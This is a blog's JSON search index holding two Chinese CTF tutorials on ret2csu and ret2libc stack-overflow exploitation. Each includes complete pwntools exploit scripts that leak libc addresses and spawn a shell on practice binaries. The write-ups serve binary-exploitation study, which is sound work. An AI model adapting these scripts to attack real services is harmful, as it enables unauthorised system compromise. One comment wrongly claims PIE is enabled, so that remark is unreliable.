{"meta":{"title":"LeonChow","subtitle":"","description":"","author":"Chow","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"pwn-ret2csu","slug":"pwn-ret2csu","date":"2025-06-10T01:27:49.000Z","updated":"2025-06-11T08:36:22.668Z","comments":true,"path":"2025/06/10/pwn-ret2csu/","permalink":"http://example.com/2025/06/10/pwn-ret2csu/","excerpt":"pwn-ret2csu介绍关于 csu 这个名词的来源于程序在编译的时候 假如调用了 libc 库中的一些函数 而在调用之前 程序会先通过一个函数初始化 libc 库 这个函数就是 void _libc_csu_init(void) 为什么要说这个函数？因为这个函数里面有一段关键代码 如下所示","text":"pwn-ret2csu介绍关于 csu 这个名词的来源于程序在编译的时候 假如调用了 libc 库中的一些函数 而在调用之前 程序会先通过一个函数初始化 libc 库 这个函数就是 void _libc_csu_init(void) 为什么要说这个函数？因为这个函数里面有一段关键代码 如下所示 123456789101112131415161718loc_4005F0: mov rdx, r15 mov rsi, r14 mov edi, r13d call qword ptr [r12+rbx*8] add rbx, 1 cmp rbx, rbp jnz short loc_4005F0 loc_400606: mov rbx, [rsp+8] mov rbp, [rsp+10h] mov r12, [rsp+18h] mov r13, [rsp+20h] mov r14, [rsp+28h] mov r15, [rsp+30h] add rsp, 38h retn 这段代码的用途在于 他会把栈内的数据初始化到寄存器 然后还会经过一个 call 函数 这个call函数也是可以通过栈内数据去修改的 他的组成就是 r12+rbx*8 也就是说我们可以让 rbx = 0 直接去控制 r12 的值 在 x64 里面 函数调用的前六个参数分别存储在 rdi rsi rdx rcx r8 r9 这六个寄存器中 而这边我们直接可以通过这种形式去控制前三个参数的值 (注意：不同版本的libc的函数位置以及函数中的汇编指令会不一样*) 例题步骤我们可以通过一个题目来看下构造的一个过程 12345int __fastcall main(int argc, const char **argv, const char **envp)&#123; write(1, &quot;Hello, World\\n&quot;, 13uLL); return vulnerable_function();&#125; 123456ssize_t vulnerable_function()&#123; _BYTE buf[128]; // [rsp+0h] [rbp-80h] BYREF return read(0, buf, 512uLL);&#125; 我们可以看到溢出点在 read 这个函数这里 怎么去计算溢出偏移就不去复现了 紧接着我们可以通过IDA去分析发现没有 类似于 system ; /bin/sh 之类的关键字符串 所以我们要去通过 libc 去构造 函数 以及参数 我们现在最要紧的是泄露出某个函数的一个 got 表中的地址 方便我们拿到 libc_base 那么怎么去构造泄露呢 之前我们说过 ret2libc 构造方式其实很简单 只需要有 puts 或者 write 的函数的plt地址调用即可 这道题目我们也可以看到他的确是有 write 这个函数的声明的 那我们怎么通过 ret2csu 的形式去构造完整的 rop 链呢 其实并不难 我们先来分析该函数的汇编代码的流程 123456789101112131415161718loc_4005F0: mov rdx, r15 ; 参数3的传递 mov rsi, r14 ; 参数2的传递 mov edi, r13d ; 参数1的传递 call qword ptr [r12+rbx*8] ; 函数调用 add rbx, 1 ; rbx+1 cmp rbx, rbp ; rbx - rbp jnz short loc_4005F0 ; 不为0 跳转 loc_400606: mov rbx, [rsp+8] ; 我们从这里开始 让ret返回到这里 之后把栈的值填充 方便后续调用 mov rbp, [rsp+10h] ; rbp 寄存器的作用主要是 cmp rbx, rbp mov r12, [rsp+18h] ; r12 可以用作控制函数指针 mov r13, [rsp+20h] ; r13 则是函数的参数1 mov r14, [rsp+28h] ; r14 则是函数的参数2 mov r15, [rsp+30h] ; r15 则是函数的参数3 add rsp, 38h ; 我们需要维持栈平衡,方便 ret 到 loc_4005F0 retn 流程我们已经分析完成了 我们可以这样做 首先让 ret 跳转到 loc_400606 之后我们填入需要的参数、函数指针、以及维持栈平衡的垃圾数据等等， 大概就是这样 123456789101112131415def csu(funcPoint,_param1,_param2,_param3): payload = cyclic(0x88) payload += p64(gadget1) payload += p64(0) payload += p64(0) payload += p64(1) payload += p64(funcPoint) # 函数指针 payload += p64(_param1) # 参数1 payload += p64(_param2) # 参数2 payload += p64(_param3) # 参数3 payload += p64(gadget2) payload += cyclic(0x38) payload += p64(main_adr) p.send(payload) sleep(1) 首先 payload 第一行是填充垃圾数据到溢出点 然后 gadget1 就是 loc_400606 、gadget2 就是 loc_4005F0 然后就是参数的填充 而我们会发现一件事 为什么在填充完 gadget1 我们又填充了 八个字节的数据 那是因为 mov rbx, [rsp+8] 是从 +8 开始的 最后的 payload += cyclic(0x38) 是为了栈平衡方便我们跳转到 main 函数 这样我们就可以构造出 write 函数的调用了 以及可以输出 got 表中的地址 1234567p.recvuntil(b&#x27;Hello, World\\n&#x27;)csu(write_got,1,write_got,8)write_real_adr = u64(p.recv(8))print(&quot;write_real_adr = &quot;,hex(write_real_adr))libc_base = write_real_adr - write_libcexecve_real_adr = libc_base + libc.symbols[&quot;execve&quot;]print(&quot;execve_real_adr = &quot;,hex(execve_real_adr)) 之后我们发现 mov edi, r13d 第一个参数是一个 32位的整数 无法容纳64位地址 所以我们需要往 bss段写入数据 构造如下 123p.recvuntil(b&#x27;Hello, World\\n&#x27;)csu(read_got,0,bss_adr,16)p.send(p64(execve_real_adr) + b&#x27;/bin/sh\\x00&#x27;) 最后我们就可以去调用 execve 拿到 shell 了 123p.recvuntil(b&#x27;Hello, World\\n&#x27;)csu(bss_adr,bss_adr+8,0,0)p.interactive() 流程图 完整 exp12345678910111213141516171819202122232425262728293031323334353637383940from pwn import*p = process(&quot;level5&quot;)e = ELF(&quot;level5&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)write_plt = e.plt[&quot;write&quot;]write_got = e.got[&quot;write&quot;]read_got = e.got[&quot;read&quot;]main_adr = e.symbols[&quot;main&quot;]write_libc = libc.symbols[&quot;write&quot;]bss_adr = e.bss()gadget1 = 0x400606gadget2 = 0x4005F0def csu(funcPoint,_param1,_param2,_param3): payload = cyclic(0x88) payload += p64(gadget1) payload += p64(0) payload += p64(0) payload += p64(1) payload += p64(funcPoint) # 函数指针 payload += p64(_param1) # 参数1 payload += p64(_param2) # 参数2 payload += p64(_param3) # 参数3 payload += p64(gadget2) payload += cyclic(0x38) payload += p64(main_adr) p.send(payload) sleep(1)p.recvuntil(b&#x27;Hello, World\\n&#x27;)csu(write_got,1,write_got,8)write_real_adr = u64(p.recv(8))print(&quot;write_real_adr = &quot;,hex(write_real_adr))libc_base = write_real_adr - write_libcexecve_real_adr = libc_base + libc.symbols[&quot;execve&quot;]print(&quot;execve_real_adr = &quot;,hex(execve_real_adr))p.recvuntil(b&#x27;Hello, World\\n&#x27;)csu(read_got,0,bss_adr,16)p.send(p64(execve_real_adr) + b&#x27;/bin/sh\\x00&#x27;)p.recvuntil(b&#x27;Hello, World\\n&#x27;)csu(bss_adr,bss_adr+8,0,0)p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwn-ret2libc","slug":"pwn-ret2libc","date":"2025-06-08T04:35:43.000Z","updated":"2025-06-09T10:25:13.102Z","comments":true,"path":"2025/06/08/pwn-ret2libc/","permalink":"http://example.com/2025/06/08/pwn-ret2libc/","excerpt":"pwn-ret2libc 题目简介本文所针对的题目是ret2libc类的基本栈溢出问题。总结而言，要想实现ret2libc，有以下几个必要条件： 1.存在溢出，且溢出范围足够大，可以覆盖到main函数的返回地址，还可以覆盖更远的区域。 2.存在类似于puts，write这样的打印函数。可以被利用，劫持程序的执行流程后，执行puts,write这样的函数打印一些已经执行过的函数的真实地址，以便我们寻找libc的基地址。 另外这类题目往往还有以下的特点，暗示我们要可能要使用ret2libc的方法： 1.开启了NX保护，即数据段不可执行。同时栈也是不可执行的。因此就别想通过写入shellcode再ret2shellcode这样的方法拿shell。 2.程序本身也没有像system(“&#x2F;bin&#x2F;sh”)这样直接的后门函数，因此我们也不要想着直接ret2text这么直接。 3.程序中可能既没有system函数，又没有”&#x2F;bin&#x2F;sh”字符串，需要我们在libc库中寻找。","text":"pwn-ret2libc 题目简介本文所针对的题目是ret2libc类的基本栈溢出问题。总结而言，要想实现ret2libc，有以下几个必要条件： 1.存在溢出，且溢出范围足够大，可以覆盖到main函数的返回地址，还可以覆盖更远的区域。 2.存在类似于puts，write这样的打印函数。可以被利用，劫持程序的执行流程后，执行puts,write这样的函数打印一些已经执行过的函数的真实地址，以便我们寻找libc的基地址。 另外这类题目往往还有以下的特点，暗示我们要可能要使用ret2libc的方法： 1.开启了NX保护，即数据段不可执行。同时栈也是不可执行的。因此就别想通过写入shellcode再ret2shellcode这样的方法拿shell。 2.程序本身也没有像system(“&#x2F;bin&#x2F;sh”)这样直接的后门函数，因此我们也不要想着直接ret2text这么直接。 3.程序中可能既没有system函数，又没有”&#x2F;bin&#x2F;sh”字符串，需要我们在libc库中寻找。 解题思路我们的目标是拿到shell，换言之就是，劫持二进制可执行文件的执行流程，让程序执行system(“&#x2F;bin&#x2F;sh”)。拆分这个目标，可以分为以下两个步骤： 1.找到system()函数和&#x2F;bin&#x2F;sh字符串在libc中的地址。 2.劫持程序的执行流程，让程序执行system(“&#x2F;bin&#x2F;sh”)。 实现第二步不难，只要精巧合理地构造溢出，把main函数的返回地址覆盖为system()函数的地址，并合理实现传参即可。关键在于如何找到system()函数和”&#x2F;bin&#x2F;sh”字符串的地址。这两个关键地址都在libc库中，这就是这类题型被叫做ret2libc的原因。那么如何寻找libc中的system()函数和”&#x2F;bin&#x2F;sh”字符串呢？这里需要用到以下公式： 函数的真实地址 &#x3D; 基地址 + 偏移地址 要牢牢记住我们的目标：找到system()函数和”&#x2F;bin&#x2F;sh”字符串的真实地址。下面我们对这个公式做一个解释： 偏移地址：libc是Linux新系统下的C函数库，其中就会有system()函数、”&#x2F;bin&#x2F;sh”字符串，而libc库中存放的就是这些函数的偏移地址。换句话说，只要确定了libc库的版本，就可以确定其中system()函数、”&#x2F;bin&#x2F;sh”字符串的偏移地址。解题核心在于如何确定libc版本，本文介绍过程将忽略这个问题，打本地直接确定为本地的libc版本即可。 基地址：每次运行程序加载函数时，函数的基地址都会发生改变。这是一种地址随机化的保护机制，导致函数的真实地址每次运行都是不一样的。然而，哪怕每次运行时函数的真实地址一直在变，最后三位确始终相同。可以根据这最后三位是什么确定这个函数的偏移地址，从而反向推断出libc的版本（此处需要用到工具LibcSearcher库，本文忽略这个步骤）。那么如何求基地址呢？如果我们可以知道一个函数的真实地址，用公式： 这次运行程序的基地址 &#x3D; 这次运行得到的某个函数func的真实地址 - 函数func的偏移地址 即可求出这次运行的基地址。 这回问题又发生了转化：如何找到某个函数func的真实地址呢？ 像puts(),write()这样的函数可以打印内容，我们可以直接利用这些打印函数，打印出某个函数的真实地址（即got表中存放的地址）。某个函数又指哪个函数呢？由于Linux的延迟绑定机制，我们必须选择一个main函数中已经执行过的函数（这样才能保证该函数在got表的地址可以被找到），选哪个都可以，当然也可以直接选puts和write，毕竟题目中像puts和write往往会直接出现在main函数中。 总结一下上面这段话，我们可以通过构造payload让程序执行puts(puts@got)或者write(1,write@got, 读取的字节数)打印puts函数&#x2F;write函数的真实地址。 整体思路总结（关键）： 1.首先寻找一个函数的真实地址，以puts为例。构造合理的payload1，劫持程序的执行流程，使得程序执行puts(puts@got)打印得到puts函数的真实地址，并重新回到main函数开始的位置。 2.找到puts函数的真实地址后，根据其最后三位，可以判断出libc库的版本（本文忽略）。 3.根据libc库的版本可以很容易的确定puts函数的偏移地址。 4.计算基地址。基地址 = puts函数的真实地址 - puts函数的偏移地址。 5.根据libc函数的版本，很容易确定system函数和&quot;/bin/sh&quot;字符串在libc库中的偏移地址。 6.根据 真实地址 = 基地址 + 偏移地址 计算出system函数和&quot;/bin/sh&quot;字符串的真实地址。 7.再次构造合理的payload2，劫持程序的执行流程，劫持到system(&quot;/bin/sh&quot;)的真实地址，从而拿到shell。 前置知识（简要了解）plt表和got表这块不用理解太深，读者嫌麻烦也可以直接看后文的解题过程，我这里总结了几位大佬的博客，做个简要介绍。 由于二进制文件本身没有 system 也没有 &#x2F;bin&#x2F;sh，需要使用 libc 中的 system 和 &#x2F;bin&#x2F;sh，知道了libc中的一个函数的地址就可以确定该程序利用的 libc版本，从而知道其他函数的地址。获得 libc 的某个函数的地址通常采用的方法是：通过 got 表泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数的地址。为什么是已经执行过的函数的地址呢，此处就要介绍plt表和got表的内容了。 got表：globle offset table 全局偏移量表，位于数据段，是一个每个条目是8字节地址的数组，用来存储外部函数在内存的确切地址。我们的最终目标就是拿到system函数的got表地址，同时知道libc的基地址的话即可找到system函数的真实地址。 plt表：procedure link table 程序链接表，位于代码段，是一个每个条目是16字节内容的数组，使得代码能够方便的访问共享的函数或者变量。可以理解为函数的入口地址，通过劫持返回地址为puts函数的plt表地址，即可执行puts函数。 说的有点绕，用大佬语雀博客中的一图以蔽之： 可执行的二进制文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址（即最靠右的两个箭头已经建立），但是在一开始（尚未发生函数调用时）就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制。 延迟绑定只有动态库libc中的函数在被调用时，才会进行地址解析和重定位工作，也就是说，只有函数发生调用之后，上图中最右侧的两个箭头才建立完成，我们才能够通过got表读取到libc中的函数。至于具体过程相对复杂，这里引用大佬博主的图片简要介绍，当程序第一次执行某个函数A时，发生的过程如下： 在可执行二进制程序调用函数A时，会先找到函数A对应的PLT表，PLT表中第一行指令则是找到函数A对应的GOT表。此时由于是程序第一次调用A，GOT表还未更新（就是图一中最右边俩箭头还没有建立），会先去公共PLT进行一番操作查找函数A的位置，找到A的位置后再更新A的GOT表，并调用函数A。当第二次执行函数A时，发生的流程就很简单了，如下图： 此时A的GOT表已经更新，可以直接在GOT表中找到其在内存中的位置并直接调用。说白了，图三就是图一。 原文链接：https://blog.csdn.net/Bossfrank/article/details/134872403 例题如下： ret2libc1 拿到题目先查属性如图所示 可以看到首先canary和PIE都没有找到但是开启了 NX 保护 那我们看下是否是静态链接的 发现是动态链接 那就麻烦了 那我们打开IDA搜下 systeam 函数吧 发现并没有函数调用 但是我们在导入表里面发现到了 system 并且在全局字符串里面找到了 /bin/sh 那就好办了 我们可以去构造payload的了 如下所示 12345678910111213141516171819202122from pwn import*p = process(&quot;ret2libc1&quot;)e = ELF(&quot;ret2libc1&quot;)system_adr = e.plt[&#x27;system&#x27;]bs = next(e.search(&quot;/bin/sh&quot;))gdb.attach(p,&quot;b *0x8048689\\nc&quot;)print(hex(system_adr))print(hex(bs))payload = b&#x27;a&#x27;*112 + p32(system_adr) + b&#x27;aaaa&#x27; + p32(bs)p.sendline(payload)p.interactive() 代码解释如下 1231.首先通过软件的 plt 动态链接表我们可以定位到系统函数&#x27;system&#x27;处2.之后我们在此通过搜索软件的常量字符串拿到 &#x27;/bin/sh&#x27;3.紧接着我们构造的payload原理是这样的 找到溢出点 更改ret的地址 之后 &#x27;构造system函数的栈帧&#x27; 也就是从&#x27;高地址到低地址传递参数、返回值&#x27; 但是我们不在乎他返回到哪里去 因为只要参数传递进去了 他就会执行从而帮我们拿到shell ret2libc2 先查属性 123456789(Pwn-py312) (base) ➜ ret2libc2 checksec ret2libc2 [*] &#x27;/home/cccccchow/pwn/AAA/山化课程/day04-ret2libc/ret2libc2/ret2libc2&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No Debuginfo: Yes 开启了 NX 看是否是静态编译 12(Pwn-py312) (base) ➜ ret2libc2 file ret2libc2 ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped 发现不是 拖到ida我们可以分析出来他有system函数但是没有 /bin/sh 我们只能自已去构造 好消息是有一个 gets 函数 并且我们还在IDA里面发现了一个 buf2 他是基于bss段的 所以我们可以吧 /bin/sh 写到这里面 让我们的 system 函数去执行就可以了 exp如下所示 12345678910111213141516from pwn import*p = process(&quot;ret2libc2&quot;)#gdb.attach(p,&quot;b *0x080486C5\\nc&quot;)sys_adr = 0x08048490gets_adr = 0x08048460bss_adr = 0x0804A080pop_ebp = 0x0804872fpayload = flat( [&#x27;a&#x27; * 112, gets_adr, pop_ebp, bss_adr, sys_adr, 0xdeadbeef, bss_adr])p.sendline(payload)p.sendline(&#x27;/bin/sh&#x27;)p.interactive() exp 解析如下所示 123456781.首先我们先从IDA中拿出 &#x27;system&#x27; 的地址 以及 &#x27;gets&#x27; 和 &#x27;bss&#x27;的地址 2.然后我们构造栈内数据 那为什么我们需要一个 &#x27;pop_ebp&#x27; 呢 3.其实主要是 &#x27;pop&#x27; 不在乎 &#x27;pop&#x27; 什么 前提是我们需要构造 &#x27;gets&#x27; 的栈帧 4.但是在构造的过程中我们把 &#x27;bss&#x27; 段的地址写在了栈内 让他当作参数执行 5.我们执行完之后如果不进行pop他就不会把参数弹出栈 6.他就会继续执行 他会以为 &#x27;bss&#x27; 是一个函数地址 7.然后 &#x27;sys_adr&#x27; 是返回值 &#x27;0xdeadbeef&#x27; 是参数 会导致一系列的问题 8.保持栈结构正确，这样才能正常执行 &#x27;system(buf2)&#x27; ret2libc3 首先查属性 NX开启 123456789(Pwn-py312) (base) ➜ ret2libc3 checksec ret2libc3[*] &#x27;/home/cccccchow/pwn/AAA/山化课程/day04-ret2libc/ret2libc3/ret2libc3&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No Debuginfo: Yes 查看文件属性 动态编译 32bit 12(Pwn-py312) (base) ➜ ret2libc3 file ret2libc3ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped 用ida打开发现有个gets 但是呢没有 system 也没有 /bin/sh 那我们只能去通过libc去计算他的值了 首先我们是本地测试 所以我们直接用一条指令查看他是那个 libc 文件即可 1234(Pwn-py312) (base) ➜ ret2libc3 ldd ret2libc3 linux-gate.so.1 (0xf7f3e000) libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7cf2000) /lib/ld-linux.so.2 (0xf7f40000) 发现是 /lib/i386-linux-gnu/libc.so.6 那么我们待会就从这里面拿出即可 因为有个gets函数 所以计算偏移的事我们就不搞了 比较简单没什么可讲的 然后因为要计算 函数起始地址所以要用到以下指令 拿到程序入口地址为 0x80484d0 123456789101112131415161718192021(Pwn-py312) (base) ➜ ret2libc3 readelf -h ./ret2libc3ELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2&#x27;s complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: EXEC (Executable file) Machine: Intel 80386 Version: 0x1 Entry point address: 0x80484d0 Start of program headers: 52 (bytes into file) Start of section headers: 6436 (bytes into file) Flags: 0x0 Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 9 Size of section headers: 40 (bytes) Number of section headers: 35 Section header string table index: 32 之后我们可以去写 exp了如下所示 1234567891011121314151617181920212223242526272829303132333435363738from pwn import*p = process(&quot;ret2libc3&quot;)e = ELF(&quot;ret2libc3&quot;)libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)puts_plt = e.plt[&#x27;puts&#x27;]puts_got = e.got[&#x27;puts&#x27;]start_addr = e.symbols[&#x27;_start&#x27;] #程序的起始地址payload = flat([b&#x27;a&#x27; * 112, puts_plt, start_addr, puts_got]) p.sendlineafter(&quot;Can you find it !?&quot;,payload)puts_real_addr = u32(p.recv()[0:4]) #接收puts的真实地址，占4个字节print(&quot;puts_plt:&#123;&#125;, puts_got: &#123;&#125;, start_addr: &#123;&#125;&quot;.format(hex(puts_plt),hex(puts_got), hex(start_addr)))print(&quot;puts_real_addr: &quot;, hex(puts_real_addr)) # 计算 puts 在libc中的偏移值libc_puts_addr = libc.sym[&#x27;puts&#x27;]print(&quot;libc_puts_addr:&quot;,hex(libc_puts_addr))# 计算libc的基地址 因为开启了 PIE所以每次都不一样 需要写在这里运行一次计算一次libc_real_addr = puts_real_addr - libc_puts_addrprint(&quot;libc_real_addr:&quot;,hex(libc_real_addr))# 计算 system 在libc中的偏移值libc_sys_addr = libc.sym[&#x27;system&#x27;]sys_addr = libc_real_addr + libc_sys_addrprint(&quot;sys_addr:&quot;,hex(sys_addr))# 计算 /bin/sh 在libc中偏移量libc_bs_addr = next(libc.search(&#x27;/bin/sh&#x27;))bs_addr = next(libc.search(&#x27;/bin/sh&#x27;)) + libc_real_addrprint(&quot;libc_bs_addr:&quot;,hex(bs_addr))payload2 = flat([b&#x27;a&#x27; * 112, sys_addr, 0x11111111, bs_addr])p.sendline(payload2)p.interactive() exp 解释 1234561.我们现在知道 libc的版本所以直接用 &#x27;ELF()&#x27; 的形式去加载他 后续我们需要获取&#x27;system&#x27;的偏移以及&#x27;/bin/sh&#x27;的偏移2.获取完程序本身的 &#x27;puts&#x27; 函数的 &#x27;plt&#x27; 表和 &#x27;got&#x27;表 我们可以通过调用 &#x27;puts&#x27; 函数的特性去把 &#x27;got&#x27; 表的地址给他泄露出来 方便后续计算偏移 再加上linux的特性延迟导入 我们也必须先执行一遍 &#x27;puts&#x27; 才会有 &#x27;got&#x27; 表的初始化3.之后我们通过获取 &#x27;libc&#x27; 里面的 &#x27;puts&#x27; 函数 我们可以通过 &#x27;puts&#x27; 在程序中的 &#x27;got&#x27; 表的值去计算出 &#x27;libc&#x27; 的基地址 毕竟全是依赖于这个库的4.既然拿到了基地址 那么 只需要获取 &#x27;system&#x27; 的偏移不就可以计算出真正的 &#x27;system&#x27; 函数的地址了 5.&#x27;bin/sh&#x27;的获取方法也是同理6.接着构建栈帧发送&#x27;payload&#x27;即可 因为我们上次&#x27;puts&#x27;的返回地址是程序的入口 相当于又执行了一遍这个程序 ret2libc3_x64 查属性 也是开启了 NX 12345678910(Pwn-py312) (base) ➜ ret2libc3 checksec ret2libc_64[*] &#x27;/home/cccccchow/pwn/AAA/山化课程/day04-ret2libc/ret2libc3/ret2libc_64&#x27; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) SHSTK: Enabled IBT: Enabled Stripped: No 查文件属性 动态编译 12(Pwn-py312) (base) ➜ ret2libc3 file ret2libc_64ret2libc_64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60d15ef4be5c2352730bc0390234cd7780c0f138, for GNU/Linux 3.2.0, not stripped 查文件入口 后续要用 或者直接在 gdb 里面 info func 也可以 一般就是 _start 123456789101112131415161718192021(Pwn-py312) (base) ➜ ret2libc3 readelf -h ret2libc_64ELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2&#x27;s complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: EXEC (Executable file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x401090 Start of program headers: 64 (bytes into file) Start of section headers: 11616 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 12 Size of section headers: 64 (bytes) Number of section headers: 31 Section header string table index: 30 IDA分析发现没有 system /bin/sh 之类的 这道题其实跟上道题差不多 唯一不同的就是传递参数的过程了所以我们还需要多弄一步就是 pop rdi 也就是从栈上把数据放到 rdi 寄存器里面 如下所示 12345(ret2libc_64/ELF/x86_64)&gt; search pop rdi[INFO] Searching for gadgets: pop rdi[INFO] File: ret2libc_640x0000000000401293: pop rdi; ret; 然后我们数据就都拿到了 exp如下所示 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *context.log_level = &#x27;debug&#x27; # 开启调试信息libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)p = process(&quot;./ret2libc_64&quot;)elf = ELF(&quot;./ret2libc_64&quot;)gdb.attach(p,&quot;b *0x401229\\nc&quot;)pop_rdi_ret = 0x401293puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]offset = 40# 构造 payload 泄露 read@gotpayload = b&quot;a&quot; * offsetpayload += p64(pop_rdi_ret)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(main_addr)p.recvuntil(b&quot;Pls Input&quot;) # 第一次提示p.send(payload)# 只收一行输出（puts 打印 puts 的地址）leak = p.recvline().strip()print(&quot;leak raw:&quot;, leak.hex())# 如果太短，再试一下用 recv(n)if len(leak) &lt; 6: leak = p.recvn(6)puts_real_addr = u64(leak.ljust(8, b&#x27;\\x00&#x27;))print(&quot;puts_real_addr: &quot;, hex(puts_real_addr))# 用 leak 计算 libc 基址libc_base = puts_real_addr - libc.sym[&#x27;puts&#x27;]print(&quot;libc_base:&quot;, hex(libc_base))system_addr = libc_base + libc.sym[&#x27;system&#x27;]bs_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))print(&quot;system_addr:&quot;,hex(system_addr))print(&quot;bs_addr:&quot;,hex(bs_addr))payload2 = b&#x27;a&#x27; * offsetpayload2 += p64(0x40101a) #需要添加一个ret，仅仅用于栈平衡payload2 += p64(pop_rdi_ret)payload2 += p64(bs_addr)payload2 += p64(system_addr)payload2 += p64(main_addr) # system 返回后跳转 main 避免崩溃p.recvuntil(&quot;Pls Input&quot;)p.send(payload2)p.interactive() exp详解 12345678910111213141516171819202122232425262728293031323334353637381.我们现在知道 libc的版本所以直接用 &#x27;ELF()&#x27; 的形式去加载他 后续我们需要获取&#x27;system&#x27;的偏移以及&#x27;/bin/sh&#x27;的偏移2.获取完程序本身的 &#x27;puts&#x27; 函数的 &#x27;plt&#x27; 表和 &#x27;got&#x27;表 我们可以通过调用 &#x27;puts&#x27; 函数的特性去把 &#x27;got&#x27; 表的地址给他泄露出来 方便后续计算偏移 再加上linux的特性延迟导入 我们也必须先执行一遍 &#x27;puts&#x27; 才会有 &#x27;got&#x27; 表的初始化3.之后我们通过获取 &#x27;libc&#x27; 里面的 &#x27;puts&#x27; 函数 我们可以通过 &#x27;puts&#x27; 在程序中的 &#x27;got&#x27; 表的值去计算出 &#x27;libc&#x27; 的基地址 毕竟全是依赖于这个库的4.既然拿到了基地址 那么 只需要获取 &#x27;system&#x27; 的偏移不就可以计算出真正的 &#x27;system&#x27; 函数的地址了 5.&#x27;bin/sh&#x27;的获取方法也是同理6.接着构建栈帧发送&#x27;payload&#x27;即可 因为我们上次&#x27;puts&#x27;的返回地址是程序的入口 相当于又执行了一遍这个程序7.但是我们在构造&#x27;payload&#x27;的时候 就不能跟32位程序一样了 必须得是用寄存器传递参数8.最后为什么加了一个&#x27;ret&#x27;来保持堆栈平衡呢? (1).x86_64 的函数调用规范要求调用前 rsp 必须是 16 字节对齐的。 (2).ret2libc 这类利用中，常常发现直接调用 system 会崩溃，因为栈没对齐导致调用约定不满足。 (3).所以常见套路是用一个短 gadget 做对齐9.以下是用 gdb 调试来看&#x27;rsp&#x27;是否16位对齐 0x40128e &lt;__libc_csu_init+005e&gt; pop r13 0x401290 &lt;__libc_csu_init+0060&gt; pop r14 0x401292 &lt;__libc_csu_init+0062&gt; pop r15 → 0x401294 &lt;__libc_csu_init+0064&gt; ret ↳ 0x766564e58750 &lt;system+0000&gt; endbr64 0x766564e58754 &lt;system+0004&gt; test rdi, rdi 0x766564e58757 &lt;system+0007&gt; je 0x766564e58760 &lt;__libc_system+16&gt; 0x766564e58759 &lt;system+0009&gt; jmp 0x766564e582d0 &lt;do_system&gt; 0x766564e5875e &lt;system+000e&gt; xchg ax, ax 0x766564e58760 &lt;system+0010&gt; sub rsp, 0x8─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;ret2libc_64&quot;, stopped 0x401294 in __libc_csu_init (), reason: SINGLE STEP───────────────────────────────────────────────────────────────────── trace ────[#0] 0x401294 → __libc_csu_init()[#1] 0x766564e58750 → &lt;system+0&gt; endbr64 [#2] 0x401176 → frame_dummy()────────────────────────────────────────────────────────────────────────────────gef➤ i r rsprsp 0x7ffcef704be0 0x7ffcef704be0gef➤ 10.判断是否16字节对齐，就是看这个值能不能被16整除，也就是看低4位（十六进制）是否为0： (1).16的十六进制是0x10 (2).计算：0x7fff8b2f8b98 % 0x10 (3).看低位：0xb98，取最低一位16进制数字，就是 8。 (4).0x8 ≠ 0x0，说明 不是16字节对齐。 总结与思考解决ret2libc这样的题目，关键就是把握两个payload的构建方法，理解如下关键公式的含义即可： 函数的真实地址 = 基地址 + 偏移地址 最后再次总结一下解题思路： 123456789101112131.首先寻找一个函数的真实地址，以puts为例。构造合理的payload1，劫持程序的执行流程，使得程序执行puts(puts@got)打印得到puts函数的真实地址，并重新回到main函数开始的位置。2.找到puts函数的真实地址后，根据其最后三位，可以判断出libc库的版本（本文忽略，实际题目要用到LibcSearch库）。3.根据libc库的版本可以很容易的确定puts函数的偏移地址。4.计算基地址。基地址 = puts函数的真实地址 - puts函数的偏移地址。5.根据libc函数的版本，确定system函数和&quot;/bin/sh&quot;字符串在libc库中的偏移地址。 6.根据 真实地址 = 基地址 + 偏移地址 